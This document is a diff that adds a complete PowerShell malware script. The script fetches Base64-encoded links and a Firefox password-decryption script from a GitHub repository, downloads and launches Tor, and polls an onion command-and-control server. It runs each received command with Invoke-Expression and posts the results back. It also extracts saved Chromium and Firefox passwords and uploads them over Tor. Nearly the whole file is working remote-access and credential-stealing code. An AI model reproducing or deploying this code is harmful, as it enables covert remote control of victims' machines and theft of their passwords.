@@ -1,0 +1,482 @@
+## VERSION 1.3.1
+
+# Forces Python processes launched by this script to use UTF-8 encoding
+$env:PYTHONUTF8 = "1"
+
+# File paths used by the script
+$log = "C:\Users\Public Documents\log.txt"       # Debug/log output
+$zip = "C:\Users\Public\link.zip"                # Downloaded archive location
+$extract = "C:\Users\Public\Extract"             # Extraction directory
+
+# Onion service used as the command-and-control server
+$url = "http://ld52qe2n47otqd63u4jqv26yyev64z2jucgidqisriv7x3fxuoetfjid.onion"
+
+
+# Downloads an encoded Tor configuration path from GitHub
+$orConfigPath = Invoke-WebRequest `
+    -Uri "https://raw.githubusercontent.com/aBolondVarazslo/holder/main/config" `
+    -UseBasicParsing |
+    Select-Object -ExpandProperty Content
+
+# Decodes the Base64 encoded configuration path
+$deConfigPath = [System.Text.Encoding]::UTF8.GetString(
+    [System.Convert]::FromBase64String($orConfigPath)
+)
+
+
+# Location where the Firefox password extraction script will be saved
+$oFFDecPath = "$extract\firefox.py"
+
+
+# Downloads the encoded payload download link
+$tLink = Invoke-WebRequest `
+    -Uri "https://raw.githubusercontent.com/aBolondVarazslo/holder/main/link" `
+    -UseBasicParsing |
+    Select-Object -ExpandProperty Content
+
+# Decodes the download URL
+$oLink = [System.Text.Encoding]::UTF8.GetString(
+    [System.Convert]::FromBase64String($tLink)
+)
+
+
+# Downloads encoded Firefox extraction script contents
+$ffDec = Invoke-WebRequest `
+    -Uri "https://raw.githubusercontent.com/aBolondVarazslo/holder/main/ffdec" `
+    -UseBasicParsing |
+    Select-Object -ExpandProperty Content
+
+# Decodes the Python script contents
+$oFFDec = [System.Text.Encoding]::UTF8.GetString(
+    [System.Convert]::FromBase64String($ffDec)
+)
+
+
+
+# Downloads the archive containing additional files
+function download {
+
+    # If extraction folder already exists, assume files are already downloaded
+    if (Test-Path $extract) {
+
+        "Already downloaded. Skipping..." |
+            Out-File -Append -FilePath $log
+
+    } else {
+
+        "DEBUG : $oLink" |
+            Out-File -Append -FilePath $log
+
+        "Downloading tar.gz..." |
+            Out-File -Append -FilePath $log
+
+
+        # Downloads archive from remote location
+        Invoke-WebRequest -Uri $oLink -OutFile $zip
+
+
+        # Check whether download succeeded
+        if (Test-Path $zip) {
+
+
+            # Creates extraction directory if missing
+            if (-not (Test-Path $extract)) {
+                New-Item -ItemType Directory -Path $extract | Out-Null
+            }
+
+
+            # Extracts archive contents
+            tar -xf $zip -C $extract
+
+
+            # Writes the decoded Firefox script to disk
+            "$oFFDec" |
+                Out-File -FilePath $oFFDecPath -Encoding ascii
+
+
+            "Cleaning archive" |
+                Out-File -FilePath $log -Append
+
+
+            # Removes downloaded archive after extraction
+            Remove-Item $zip
+
+
+        } else {
+
+            "Failed to download archive." |
+                Out-File -FilePath $log -Append
+        }
+    }
+}
+
+
+
+# Creates Tor configuration file if it does not already exist
+function writeConfig {
+
+    if (!(Test-Path $deConfigPath)) {
+
+        # Opens local SOCKS proxy on port 9050
+        "SOCKSPort 9050" |
+            Out-File -FilePath $deConfigPath -Encoding ascii
+    }
+}
+
+
+
+# Starts the Tor executable downloaded earlier
+function startTor {
+
+    Start-Process `
+        -FilePath "$extract\Tor\tor.exe" `
+        -ArgumentList "-f $deConfigPath" `
+        -WindowStyle Normal
+}
+
+
+
+# Waits until Tor's SOCKS proxy becomes available
+function waitForTor {
+
+    do {
+
+        # Wait three seconds before checking again
+        Start-Sleep -Seconds 3
+
+
+        # Tests whether port 9050 is accepting connections
+        $ready = Test-NetConnection `
+            -ComputerName 127.0.0.1 `
+            -Port 9050
+
+
+    } until ($ready.TcpTestSucceeded)
+
+
+    "Tor connection established." |
+        Out-File -Append -FilePath $log
+}
+
+
+
+# Main command execution loop
+function main {
+
+    try {
+
+
+        # Sends request through Tor to retrieve a command
+        $cmd = & curl.exe `
+            --socks5-hostname 127.0.0.1:9050 `
+            "$url/get"
+
+
+        # Logs received command
+        "$((Get-Date).ToString()) - Command received: $cmd" |
+            Out-File -Append -FilePath $log
+
+
+
+        # Ignore empty commands and "noop" responses
+        if ($cmd -and $cmd -ne "noop") {
+
+            try {
+
+
+                # Executes the received PowerShell command
+                # WARNING:
+                # This allows the remote server to execute arbitrary commands
+                $output = Invoke-Expression $cmd 2>&1 |
+                    Out-String
+
+
+
+                # Remove blank lines from output
+                $output = ($output -split "`r?`n" |
+                    Where-Object {
+                        $_.Trim() -ne ""
+                    }) -join "`n"
+
+
+
+                $outText = "SUCCESS:`n$output"
+
+
+                # Write command result to local log
+                $outText |
+                    Out-File -Append -FilePath $log
+
+
+
+                # Encode response as Base64
+                $eOutput = [Convert]::ToBase64String(
+                    [Text.Encoding]::UTF8.GetBytes($outText)
+                )
+
+
+                # Sends command result back to server
+                & curl.exe `
+                    --socks5-hostname 127.0.0.1:9050 `
+                    -X POST `
+                    -H "Content-Type: text/plain" `
+                    -d $eOutput `
+                    "$url/report"
+
+
+            } catch {
+
+
+                # Handles command execution errors
+                $err = "ERROR: $($_.Exception.Message)"
+
+
+                $err |
+                    Out-File -Append -FilePath $log
+
+
+                # Encode error message
+                $eErr = [Convert]::ToBase64String(
+                    [Text.Encoding]::UTF8.GetBytes($err)
+                )
+
+
+                # Report error back
+                & curl.exe `
+                    --socks5-hostname 127.0.0.1:9050 `
+                    -X POST `
+                    -H "Content-Type: text/plain" `
+                    -d $eErr `
+                    "$url/report"
+            }
+        }
+
+
+    } catch {
+
+        # Log general failures
+        "ERROR: $($_.Exception.Message)" |
+            Out-File -Append -FilePath $log
+    }
+
+
+    # Delay before next command check
+    Start-Sleep -Seconds 5
+}
+
+
+
+# Attempts to extract browser passwords
+function testPython {
+
+
+    # Installs Python dependency
+    pip install pycryptodomex | Out-Null
+
+
+    # Runs Python helper script
+    python test.py
+
+
+
+    # JSON file containing browser database paths
+    $jsonPath = "C:\Users\Public\browser_pw_paths.json"
+
+
+    if (Test-Path $jsonPath) {
+
+
+        # Load JSON data
+        $json = Get-Content $jsonPath |
+            ConvertFrom-Json
+
+
+
+        # Loop through browsers
+        foreach ($entry in $json.PSObject.Properties) {
+
+
+            $browser = $entry.Name
+            $path = $entry.Value
+
+
+            if ($path) {
+
+
+                # Firefox uses a different extraction method
+                if ($browser -eq "firefox") {
+
+
+                    $outFile = "${extract}\firefox_decrypted.txt"
+
+
+                    # Run Firefox password extraction script
+                    python $oFFDecPath
+
+
+                    # Upload extracted data
+                    sendLogs $outFile
+
+
+
+                } else {
+
+
+                    # Extract Chromium passwords
+                    $outFile = deChromPass $path $browser
+
+
+                    # Upload extracted passwords
+                    sendLogs $outFile
+                }
+            }
+        }
+
+
+    } else {
+
+
+        "Log paths JSON not found at $jsonpath" |
+            Out-File -Append -FilePath $log
+    }
+}
+
+
+
+# Sends a file to the remote server
+function sendLogs($logsPath) {
+
+
+    if (Test-Path $logsPath) {
+
+
+        # Read file bytes
+        $bytes = [System.IO.File]::ReadAllBytes($logsPath)
+
+
+        # Convert bytes to Base64
+        $protected = [Convert]::ToBase64String($bytes)
+
+
+        "Sending encoded data..." |
+            Out-File -Append -FilePath $log
+
+
+
+        # Temporary file containing encoded data
+        $tempDataFile = "$env:TEMP\curl_data.txt"
+
+
+        Set-Content `
+            -Path $tempDataFile `
+            -Value $protected `
+            -Encoding ascii
+
+
+
+        # Upload file contents
+        & curl.exe `
+            --socks5-hostname 127.0.0.1:9050 `
+            -X POST `
+            -H "Content-Type: text/plain" `
+            --data "@$tempDataFile" `
+            "$url/report"
+
+
+
+        # Remove temporary file
+        Remove-Item $tempDataFile -ErrorAction SilentlyContinue
+
+
+    } else {
+
+
+        "Log $logsPath not found" |
+            Out-File -Append -FilePath $log
+    }
+}
+
+
+
+# Extracts passwords from Chromium-based browsers
+function deChromPass {
+
+    param(
+        $dbPath,
+        $browser
+    )
+
+
+    # Chromium stores encryption keys in Local State
+    $localState = $dbPath -replace "Login Data", "Local State"
+
+
+    $outFile = "C:\Users\Public\Extact\PWDs\${browser}.txt"
+
+
+
+    # Run Python extractor
+    $pythonOutput = & python `
+        "C:\Users\Public\Extract\chromium.py" `
+        "$dbPath" `
+        "$localState" `
+        "$outFile" `
+        2>&1
+
+
+    $pythonOutput |
+        Out-File -Append -FilePath $log
+
+
+    return $outFile
+}
+
+
+
+# Uploads a file with an attached message
+function sendFileWithText {
+
+    param (
+        [string]$filePath,
+        [string]$textMessage
+    )
+
+
+    $tPro = "127.0.0.1:9050"
+    $urlReport = "$url/report"
+
+
+    if (-Not (Test-Path $filePath)) {
+
+        Write-Output "File not found: $filePath"
+        return
+    }
+
+
+    $file = Get-Item $filePath
+
+
+
+    # Sends multipart form request through Tor
+    curl.exe `
+        --socks5-hostname $tPro `
+        -F "file=@$($file.FullName)" `
+        -F "note=$textMessage" `
+        $urlReport
+}
+
+
+
+# Initial setup
+download
+writeConfig
+startTor
+waitForTor
+
+
+
+# Forever loop
+while ($true) {
+
+    main
+}
